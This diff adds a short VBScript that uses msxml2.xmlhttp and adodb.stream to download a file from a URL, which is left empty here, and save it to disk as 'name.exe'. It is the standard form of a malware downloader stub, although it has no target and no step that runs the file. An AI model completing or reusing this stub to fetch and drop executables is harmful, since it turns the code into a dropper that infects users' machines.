@@ -1,0 +1,16 @@
+
+
+Dim obj1,obj2
+Dim url  
+start = timer  
+url = ""  
+Set obj1 = CreateObject("msxml2.xmlhttp")  
+Set obj2 = CreateObject("adodb.stream")  
+obj1.open "get",url,False  
+obj1.send  
+temp = obj1.responseBody  
+obj2.Type = 1  
+obj2.Mode = 3  
+obj2.Open()  
+obj2.Write(temp)  
+obj2.SaveToFile "name.exe",2 
